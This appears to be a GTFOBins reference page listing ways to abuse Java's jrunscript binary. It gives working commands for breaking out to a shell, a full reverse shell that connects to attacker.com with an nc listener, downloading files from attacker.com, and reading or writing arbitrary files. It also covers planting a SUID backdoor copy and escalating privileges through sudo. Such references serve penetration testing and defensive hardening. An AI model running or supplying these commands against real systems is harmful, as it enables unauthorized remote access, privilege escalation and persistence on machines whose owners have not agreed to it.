# GTFOBin: jrunscript

This tool is installed starting with Java SE 6.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
jrunscript -e "cp('$URL','$LFILE')"
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read")); while ((line = br.readLine()) != null) { print(line); }'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This has been found working in macOS but failing on Linux systems.

```
sudo install -m =xs $(which jrunscript) .

./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
```